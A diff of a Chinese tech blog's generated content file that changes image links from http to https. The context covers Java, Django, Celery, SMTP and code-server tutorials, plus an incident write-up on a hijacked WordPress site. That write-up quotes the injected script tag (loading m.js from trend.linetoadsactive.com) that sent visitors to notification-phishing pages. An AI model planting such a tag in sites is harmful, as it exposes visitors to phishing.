@@ -26,7 +26,7 @@
 <p>切换对应Java版本</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo archlinux-java <span class="built_in">set</span> java-8-openjdk/jre</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="http://img.owq.world/2022/09/0131-3aad7c.png"></p>
+<p><img data-src="https://img.owq.world/2022/09/0131-3aad7c.png"></p>
 <h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><h3 id="搜索包-2"><a href="#搜索包-2" class="headerlink" title="搜索包"></a>搜索包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum list *openjdk*</span><br></pre></td></tr></table></figure>
 
 <h3 id="安装所需版本-2"><a href="#安装所需版本-2" class="headerlink" title="安装所需版本"></a>安装所需版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y java-17-openjdk-headless.x86_64</span><br><span class="line">yum install -y java-1.8.0-openjdk-headless.x86_64</span><br></pre></td></tr></table></figure>
@@ -59,13 +59,13 @@
 
 <h2 id="激活一言窗口"><a href="#激活一言窗口" class="headerlink" title="激活一言窗口"></a>激活一言窗口</h2><p>编辑<code>themes/next/_config.yml</code>文件</p>
 <p>找到<code>custom_file_path</code>修改<code>sidebar</code>为<code>themes/next/layout/_custom/sidebar.swig</code>, 才会加载定制的侧边栏内容.</p>
-<p><img data-src="http://img.owq.world/2022/08/1341-e8a05e.png"></p>
+<p><img data-src="https://img.owq.world/2022/08/1341-e8a05e.png"></p>
 <h2 id="添加一言CSS"><a href="#添加一言CSS" class="headerlink" title="添加一言CSS"></a>添加一言CSS</h2><p>编辑<code>themes/next/source/css/_custom/custom.styl</code>文件</p>
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//hitokoto</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_wrap</span> &#123;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_text</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: left;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.8125em</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#hitokoto_from</span> &#123;</span><br><span class="line">  <span class="attribute">text-align</span>: right;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">0.7em</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#999</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="导入一言CSS"><a href="#导入一言CSS" class="headerlink" title="导入一言CSS"></a>导入一言CSS</h2><p>编辑<code>themes/next/source/css/main.styl</code>文件</p>
 <p>在末尾添加<code>@import &quot;_custom/custom&quot;;</code>, 这样css才会生效.</p>
-<p><img data-src="http://img.owq.world/2022/08/1359-e8a23d.png"></p>
+<p><img data-src="https://img.owq.world/2022/08/1359-e8a23d.png"></p>
 <hr>
 <blockquote>
 <p>测试效果 -&gt; 同步配置 -&gt; 大功告成🎉</p>
@@ -93,14 +93,14 @@
 <h2 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h2><blockquote>
 <p>先看看被黑是什么样子的.</p>
 </blockquote>
-<p>打开网站会重定向到钓鱼页面, 然后提示你点击&quot;允许通知&quot;, 如果在这里点击&quot;Allow&quot;的话, 猜测则会通过系统的消息通知来进行&quot;攻击&quot;.<br><img data-src="http://img.owq.world/2022/06/1617-775e43.png"></p>
+<p>打开网站会重定向到钓鱼页面, 然后提示你点击&quot;允许通知&quot;, 如果在这里点击&quot;Allow&quot;的话, 猜测则会通过系统的消息通知来进行&quot;攻击&quot;.<br><img data-src="https://img.owq.world/2022/06/1617-775e43.png"></p>
 <blockquote>
 <p>最为有趣的是, 这个钓鱼页面很&quot;聪明&quot;, 如果等一段时间(大概几秒)没有见你点击&quot;Allow&quot;后, 会随机跳转到另外一个钓鱼页面.</p>
 </blockquote>
 <p>像下图这样的, 直接告诉你可以解决刚刚出现的莫名弹窗(笑), 别说, 如果是个电脑小白还真会上钩, 毕竟, 这过程很&quot;合理&quot;.</p>
-<p><img data-src="http://img.owq.world/2022/06/1100-be149e.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1100-be149e.png"></p>
 <p>这是随机跳到的另一个钓鱼页面, 也是同样的套路.</p>
-<p><img data-src="http://img.owq.world/2022/06/1100-76eb4c.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1100-76eb4c.png"></p>
 <h2 id="定位问题原因"><a href="#定位问题原因" class="headerlink" title="定位问题原因"></a>定位问题原因</h2><ol>
 <li><p>这个很明显是网站被劫持了, 那么第一步要确认是怎么被劫持了? 是DNS劫持还是网站被黑了?</p>
 </li>
@@ -127,13 +127,13 @@
 <p>捡起老本行(逆向), 分析一波网络请求先, 很轻松的就找到恶意代码.</p>
 </blockquote>
 <p>首先, 搜索一开始跳转的域名, 找到该请求, 并没有得到有价值的信息, 我们需要找到发起该请求的地方.</p>
-<p><img data-src="http://img.owq.world/2022/06/1101-32167f.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1101-32167f.png"></p>
 <p>这时观察一下网络条, 发现有个地方存在异常, 请求了其它域名, 因为网站只连接了一个域名, 正常情况下应该是只有一条线.</p>
-<p><img data-src="http://img.owq.world/2022/06/1100-a0d616.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1100-a0d616.png"></p>
 <p>让我们选中这个异常的网络块, 跳到发起的请求看看.</p>
-<p><img data-src="http://img.owq.world/2022/06/1117-719ccf.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1117-719ccf.png"></p>
 <p>点开里面的内容一看, 果不其然, 这一段天书般的代码, 就是我们要找的东西了.</p>
-<p><img data-src="http://img.owq.world/2022/06/1116-1922b9.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1116-1922b9.png"></p>
 <hr>
 <blockquote>
 <p>这一段是复盘的时候加上去的.</p>
@@ -153,7 +153,7 @@
 <h2 id="清除恶意代码"><a href="#清除恶意代码" class="headerlink" title="清除恶意代码"></a>清除恶意代码</h2><p>顺藤摸瓜, 找到DB.<code>wp_posts</code>里的恶意代码, 这里使用<code>phpMyAdmin</code>去连接(通过WP插件).</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=’text/javascript’ src=’<span class="attr">https</span>:<span class="comment">//trend.linetoadsactive.com/m.js?n=ns1′&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img data-src="http://img.owq.world/2022/06/1125-160779.png"></p>
+<p><img data-src="https://img.owq.world/2022/06/1125-160779.png"></p>
 <p>然而, 在时间急迫的情况下(还有其它事情要做), 以及翻了好几页都是相同内容的误导中, 直接使用<code>UPDATE wp_posts SET post_content = &quot;&quot;</code>语句(真是个大聪明).<br>结果, <code>post_content</code> 被清空了, 页面内容被清空...</p>
 <h2 id="回滚数据"><a href="#回滚数据" class="headerlink" title="回滚数据"></a>回滚数据</h2><blockquote>
 <p>参考文章: <span class="exturl" data-url="aHR0cHM6Ly93d3cucGNoNTIwLmNvbS9hcnRpY2xlLzM2">https://www.pch520.com/article/36</span></p>
@@ -197,7 +197,7 @@
 </ul>
 </li>
 </ul>
-<p><img data-src="http://img.owq.world/2022/05/1540-a7efa3.png"></p>
+<p><img data-src="https://img.owq.world/2022/05/1540-a7efa3.png"></p>
 <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> -U Celery</span><br></pre></td></tr></table></figure>
 
 <p>这里用 <code>Redis</code> 作为传递消息队列和后端, 可以直接安装捆绑包.</p>
@@ -422,9 +422,9 @@
 <li><p>登录网页版邮箱 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9vdXRsb29rLmNvbS8=">https://outlook.com</span></p>
 </li>
 <li><p>右上角打开<code>设置</code>-搜索<code>IMAP</code>-打开<code>POP和IMAP</code>设置</p>
-<p><img data-src="http://img.owq.world/2022/04/2141-ca5732.png"></p>
+<p><img data-src="https://img.owq.world/2022/04/2141-ca5732.png"></p>
 </li>
-<li><p>默认是开启<code>SMTP </code>服务的<br><img data-src="http://img.owq.world/2022/05/2055-d813fd.png"></p>
+<li><p>默认是开启<code>SMTP </code>服务的<br><img data-src="https://img.owq.world/2022/05/2055-d813fd.png"></p>
 </li>
 <li><p>记录下 <code>SMTP</code> 配置</p>
 <figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">服务器名称: smtp.office365.com</span></span><br><span class="line"><span class="section">端口: 587</span></span><br><span class="line"><span class="section">加密方法: STARTTLS</span></span><br></pre></td></tr></table></figure></li>
@@ -469,7 +469,7 @@
 
 <center>↓ 效果是这样子 ↓</center>
 
-<p><img data-src="http://img.owq.world/2022/05/1749-a5c938.gif"></p>
+<p><img data-src="https://img.owq.world/2022/05/1749-a5c938.gif"></p>
 <p><em>注: 仅适用 Windows 桌面环境</em></p>
 <h3 id="封装函数"><a href="#封装函数" class="headerlink" title="封装函数"></a>封装函数</h3><p>创建<code>templates\archive_pic.html</code>编写内容模板, 便于邮件内容修改.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Archive&lt;/h1&gt;</span><br><span class="line">&#123;&#123; pic &#125;&#125;</span><br></pre></td></tr></table></figure>
@@ -487,7 +487,7 @@
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendArchiveEmail</span></span> &#123;</span><br><span class="line">    <span class="variable">$Pwd</span> = <span class="built_in">Get-Location</span></span><br><span class="line">    <span class="built_in">Write-Output</span> <span class="string">&#x27;Start send_archive_email.py.&#x27;</span></span><br><span class="line">    <span class="built_in">cd</span> D:\Project\auto_email &amp;&amp; python send_archive_email.py</span><br><span class="line">    <span class="built_in">cd</span> <span class="variable">$Pwd</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">New-Alias</span> <span class="built_in">send-email</span> sendArchiveEmail</span><br></pre></td></tr></table></figure>
 
 <p>刷新终端后使用<code>send-email</code>命令就可以启动脚本了</p>
-<p><img data-src="http://img.owq.world/2022/05/2134-5ee714.gif"></p>
+<p><img data-src="https://img.owq.world/2022/05/2134-5ee714.gif"></p>
 ]]></content>
       <categories>
         <category>技术记录</category>
@@ -695,7 +695,7 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from myblog.models import Person</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p = Person(name=<span class="string">&#x27;owq&#x27;</span>)</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; p.save()</span></span><br></pre></td></tr></table></figure>
 
 <p>回头看看数据库</p>
-<p><img data-src="http://img.owq.world/2022/03/1553-ee0a9f.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1553-ee0a9f.png"></p>
 <h2 id="数据表重构"><a href="#数据表重构" class="headerlink" title="数据表重构"></a>数据表重构</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><blockquote>
 <p>执行<code>python manage.py migrate</code>同步失败时</p>
 </blockquote>
@@ -969,7 +969,7 @@
 <p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yLw==">Django 文档</span></p>
 </blockquote>
 <h2 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h2><p>3.2的LTS版本在21年的4月份发布, 会作为下一个主流版本, 这里从3.2版本进行学习.</p>
-<p><img data-src="http://img.owq.world/2022/03/2350-d2127f.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/2350-d2127f.png"></p>
 <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install django==3.2</span><br></pre></td></tr></table></figure>
 
 <h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">django-admin startproject mysite</span><br></pre></td></tr></table></figure>
@@ -1007,18 +1007,18 @@
 </ul>
 <h3 id="运行启动"><a href="#运行启动" class="headerlink" title="运行启动"></a>运行启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定8888端口启动, 不指定默认端口为8000</span></span><br><span class="line">python manage.py runserver 8888</span><br></pre></td></tr></table></figure>
 
-<p>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4Lw==">http://127.0.0.1:8888</span> 就可以看见初始页面了.<br><img data-src="http://img.owq.world/2022/03/1645-a7966d.png"></p>
+<p>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4Lw==">http://127.0.0.1:8888</span> 就可以看见初始页面了.<br><img data-src="https://img.owq.world/2022/03/1645-a7966d.png"></p>
 <h2 id="MTV模型"><a href="#MTV模型" class="headerlink" title="MTV模型"></a>MTV模型</h2><blockquote>
 <p>Django使用的是MTV模型, 知其所以然在之后学习上才不至于犯迷糊.</p>
 </blockquote>
-<p><img data-src="http://img.owq.world/2022/03/0040-734987.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/0040-734987.png"></p>
 <h3 id="Model-模型"><a href="#Model-模型" class="headerlink" title="Model(模型)"></a>Model(模型)</h3><p><code>django</code>提供了一个抽象的模型层, 目的是为了构建和操纵当前Web应用的数据.</p>
 <blockquote>
 <p>简单来说, <code>model</code>层就是用来和数据库进行交互的.<br><code>Django</code>最出名的就是它的<code>orm</code>, <code>Object Relational Mapping</code> 对象关系映射</p>
 </blockquote>
 <h3 id="Templat-模板"><a href="#Templat-模板" class="headerlink" title="Templat(模板)"></a>Templat(模板)</h3><p><code>View</code>将数据传递给模板层进行渲染, 之后将渲染好的页面返回到客户端.<br>模板层提供了一个对设计者友好的语法用于渲染向用户呈现的信息. </p>
 <h3 id="View-视图"><a href="#View-视图" class="headerlink" title="View(视图)"></a>View(视图)</h3><p>视图层, 负责处理用户请求和响应, 处理业务逻辑的.</p>
-<h3 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h3><p><img data-src="http://img.owq.world/2022/03/1635-5f7438.png"></p>
+<h3 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h3><p><img data-src="https://img.owq.world/2022/03/1635-5f7438.png"></p>
 <blockquote>
 <p><code>Django</code>的MTV模型和MVC本质上是相同的, MTV 是 MVC 的一种细化, 将原来 MVC 中的 V 层拿出来进行分离, 视图的显示与如何显示交给 Template 层, 而 View 层更专注于实现业务逻辑.<br>其实在 Django 是有 Controller 层的, 只不过它由框架本身来实现, 所以我们不用关心它.<br>Django 更关注于M、T 和 V</p>
 </blockquote>
@@ -1041,10 +1041,10 @@
 <p>这里需要注意一个点, Django并不会自动帮我们建库, 如果直接运行的话, 会报错:<code>django.db.utils.OperationalError: (1049, &quot;Unknown database &#39;polls&#39;&quot;)</code>, 表示没有<code>polls</code>这个数据库</p>
 </blockquote>
 <p>这里手动建下库, 注意下<strong>字符集</strong>和<strong>排序规则</strong>.</p>
-<img data-src="http://img.owq.world/2022/03/1611-713a00.png" style="zoom:80%;" />
+<img data-src="https://img.owq.world/2022/03/1611-713a00.png" style="zoom:80%;" />
 
 <p>建好后的表是这样子的.</p>
-<img data-src="http://img.owq.world/2022/03/1619-5b9089.png" style="zoom:67%;" />
+<img data-src="https://img.owq.world/2022/03/1619-5b9089.png" style="zoom:67%;" />
 
 <h3 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h3><h4 id="添加应用"><a href="#添加应用" class="headerlink" title="添加应用"></a>添加应用</h4><p>修改<code>polls/models.py</code>, 添加投票应用, 这里创建<code>Question</code>、<code>Choice</code>两个模型.</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    question_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># 问题描述</span></span><br><span class="line">    pub_date = models.DateTimeField(<span class="string">&#x27;date published&#x27;</span>)	<span class="comment"># 发布时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 表示每个Choice对象都关联到一个Question对象</span></span><br><span class="line">    question = models.ForeignKey(Question, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">    choice_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># 选项描述</span></span><br><span class="line">    votes = models.IntegerField(default=<span class="number">0</span>)	<span class="comment"># 当前得票数</span></span><br></pre></td></tr></table></figure>
@@ -1063,7 +1063,7 @@
 <figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> sqlmigrate polls <span class="number">0001</span></span><br></pre></td></tr></table></figure>
 
 <p>这时候查看数据库才可以看到创建的表.</p>
-<img data-src="http://img.owq.world/2022/03/1707-60768e.png" style="zoom:67%;" /></li>
+<img data-src="https://img.owq.world/2022/03/1707-60768e.png" style="zoom:67%;" /></li>
 </ul>
 <h3 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h3><ul>
 <li><p>安装依赖包, 用于密码加密处理</p>
@@ -1080,13 +1080,13 @@
 <p>如果你之前没有关闭<code>Django</code>的话, 会发现已经热更新代码了.</p>
 </blockquote>
 <p>这时浏览器输入<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4L2FkbWluJUU4JUJGJTlCJUU1JTg1JUE1JUU3JUFFJUExJUU3JTkwJTg2JUU1JTkwJThFJUU1JThGJUIw">http://127.0.0.1:8888/admin进入管理后台</span>.</p>
-<p><img data-src="http://img.owq.world/2022/03/1524-562a9a.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1524-562a9a.png"></p>
 <p>登录后能看到已经添加的投票应用接口.</p>
-<p><img data-src="http://img.owq.world/2022/03/1525-d3fb89.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1525-d3fb89.png"></p>
 <p>在这里进行添加下问题.</p>
-<p><img data-src="http://img.owq.world/2022/03/1529-c70549.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1529-c70549.png"></p>
 <p>添加完后前往数据库看看,是不是新增了刚刚的问题呢.</p>
-<img data-src="http://img.owq.world/2022/03/1530-4df650.png" style="zoom:67%;" />
+<img data-src="https://img.owq.world/2022/03/1530-4df650.png" style="zoom:67%;" />
 
 <p>这得益于ORM, 这部分和数据库交互的操作不用我们手动实现.<br>对于个人开发者来说, 很是方便, 但对于如今前后端分离的大环境下,可能并没有那么给力, 当然, 这是后话了.</p>
 <h2 id="使用API"><a href="#使用API" class="headerlink" title="使用API"></a>使用API</h2><blockquote>
@@ -1158,7 +1158,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置命名空间</span></span><br><span class="line">app_name = <span class="string">&#x27;polls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里需要注意的是, URL匹配是按照顺序进行的.</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># ex: /polls/</span></span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/&#x27;</span>, views.detail, name=<span class="string">&#x27;detail&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/results/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/results/&#x27;</span>, views.results, name=<span class="string">&#x27;results&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/vote/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/vote/&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 
 <p><strong>测试一下</strong></p>
-<p><img data-src="http://img.owq.world/2022/03/1111-d7b801.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1111-d7b801.png"></p>
 <h2 id="模板层"><a href="#模板层" class="headerlink" title="模板层"></a>模板层</h2><blockquote>
 <p>一个正常的网站不会只有文字, 还需要有相应的UI界面, 这时候模板就上线了. </p>
 </blockquote>
@@ -1180,7 +1180,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    context = &#123;<span class="string">&#x27;latest_question_list&#x27;</span>: latest_question_list&#125;</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/index.html&#x27;</span>, context)</span><br></pre></td></tr></table></figure>
 
 <p>这时候再看看页面,是不是样式就变了呢</p>
-<img data-src="http://img.owq.world/2022/03/1151-83aa8f.png" style="zoom:80%;" />
+<img data-src="https://img.owq.world/2022/03/1151-83aa8f.png" style="zoom:80%;" />
 
 <h3 id="处理404"><a href="#处理404" class="headerlink" title="处理404"></a>处理404</h3><p>问题id没有对应数据时抛出404</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> Http404</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        question = Question.objects.get(pk=question_id)</span><br><span class="line">    <span class="keyword">except</span> Question.DoesNotExist:</span><br><span class="line">        <span class="keyword">raise</span> Http404(<span class="string">&quot;Question does not exist&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">&#x27;polls/detail.html&#x27;</span>, &#123;<span class="string">&#x27;question&#x27;</span>: question&#125;)</span><br></pre></td></tr></table></figure>
@@ -1195,7 +1195,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DEBUG = <span class="literal">False</span>	<span class="comment"># 关闭调试</span></span><br><span class="line"></span><br><span class="line">ALLOWED_HOSTS = [<span class="string">&#x27;127.0.0.1&#x27;</span>]	<span class="comment"># 添加合法主机地址</span></span><br></pre></td></tr></table></figure>
 
 <p>测试一下, 默认返回会是这个样子, 但实际应用上很少有网站会给用户返回这样简陋的页面, 一般是会做重定向处理的.</p>
-<img data-src="http://img.owq.world/2022/03/1424-023cc2.png" style="zoom:80%;" />
+<img data-src="https://img.owq.world/2022/03/1424-023cc2.png" style="zoom:80%;" />
 
 
 
@@ -1219,9 +1219,9 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Choice, Question</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChoiceInline</span>(admin.StackedInline):</span><br><span class="line">    model = Choice</span><br><span class="line">    extra = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">QuestionAdmin</span>(admin.ModelAdmin):</span><br><span class="line">    fieldsets = [</span><br><span class="line">        (<span class="literal">None</span>,               &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;question_text&#x27;</span>]&#125;),</span><br><span class="line">        (<span class="string">&#x27;Date information&#x27;</span>, &#123;<span class="string">&#x27;fields&#x27;</span>: [<span class="string">&#x27;pub_date&#x27;</span>], <span class="string">&#x27;classes&#x27;</span>: [<span class="string">&#x27;collapse&#x27;</span>]&#125;),</span><br><span class="line">    ]</span><br><span class="line">    inlines = [ChoiceInline]</span><br><span class="line"></span><br><span class="line">admin.site.register(Question, QuestionAdmin)</span><br></pre></td></tr></table></figure>
 
 <p>进入后台管理, 修改相应的选项保存后就可以进行测试了.</p>
-<p><img data-src="http://img.owq.world/2022/03/1708-84d281.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1708-84d281.png"></p>
 <p>测试一下</p>
-<p><img data-src="http://img.owq.world/2022/03/1712-601d4a.png"></p>
+<p><img data-src="https://img.owq.world/2022/03/1712-601d4a.png"></p>
 <blockquote>
 <p>到此, 算是对<code>Django</code>简单的入了个门, 下一篇文章详细讲讲<code>Django</code>中的模型层, 让咱们逐步深入ヾ(•ω•&#96;)o</p>
 </blockquote>
@@ -1253,11 +1253,11 @@
 <h2 id="脚本安装"><a href="#脚本安装" class="headerlink" title="脚本安装"></a>脚本安装</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>先运行下测试，这条命令只是输出执行安装步骤，不会进行安装。</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh -s -- --dry-run</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="http://img.owq.world/2022/01/2116-18d0a8.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/2116-18d0a8.png"></p>
 <p>可以看到是下载了<code>code-server_4.0.1_amd64.deb</code>包到<code>~/.cache/code-server/</code>下然后继续安装就完事了。<br>了解了下脚本做的事，接下来直接安装就行了。</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:<span class="regexp">//</span>code-server.dev/install.sh | sh</span><br></pre></td></tr></table></figure>
 
-<p><img data-src="http://img.owq.world/2022/01/1253-9d7fca.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1253-9d7fca.png"></p>
 <p>这里你会可能会遇到<code>github</code>被墙导致下载不辽或者下载缓慢的问题，这时配置下<code>/etc/ssh/ssh_config</code>中的<code>GSSAPIAuthentication</code>设置为<code>no</code>一般就能解决问题，解决不辽问题的话就只能使用科学的魔法了~</p>
 <h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">vim ~<span class="regexp">/.config/</span>code-server/config.yaml</span><br></pre></td></tr></table></figure>
 
@@ -1266,11 +1266,11 @@
 <h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> --now code-server@<span class="variable">$USER</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>先使用<code>ssh</code>转发到本地端口后，浏览器打开<code>http://localhost:8080</code>进入登录页面</p>
-<p><img data-src="http://img.owq.world/2022/01/1658-ae2061.png" alt="image-20220107165822570"></p>
+<p><img data-src="https://img.owq.world/2022/01/1658-ae2061.png" alt="image-20220107165822570"></p>
 <p>输入密码登录后就可以看到熟悉的开始页面了~</p>
-<p><img data-src="http://img.owq.world/2022/01/1706-df356f.png"></p>
-<p>先不急，为了让大部分快捷键可以正常使用，先把网页添加成应用<br><img data-src="http://img.owq.world/2022/01/1717-2a8ff3.png"></p>
-<img data-src="http://img.owq.world/2022/01/1714-27070f.png" style="zoom: 50%;" />
+<p><img data-src="https://img.owq.world/2022/01/1706-df356f.png"></p>
+<p>先不急，为了让大部分快捷键可以正常使用，先把网页添加成应用<br><img data-src="https://img.owq.world/2022/01/1717-2a8ff3.png"></p>
+<img data-src="https://img.owq.world/2022/01/1714-27070f.png" style="zoom: 50%;" />
 
 <p>之后就开始配置你的<code>vsCode</code>吧~</p>
 <h2 id="暴露公网"><a href="#暴露公网" class="headerlink" title="暴露公网"></a>暴露公网</h2><blockquote>
@@ -1280,7 +1280,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装certbot</span></span><br><span class="line">sudo apt install -y certbot python3-certbot-nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建证书 并自动配置 Nginx</span></span><br><span class="line">sudo certbot --non-interactive --redirect --agree-tos --nginx -d [域名] -m [邮箱]</span><br></pre></td></tr></table></figure>
 
 <p>生成的配置应该是这样子</p>
-<p><img data-src="http://img.owq.world/2022/01/2205-ba41b1.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/2205-ba41b1.png"></p>
 <p>重载<code>nginx</code>应用配置</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t <span class="comment"># 测试</span></span><br><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
 
@@ -1321,43 +1321,43 @@
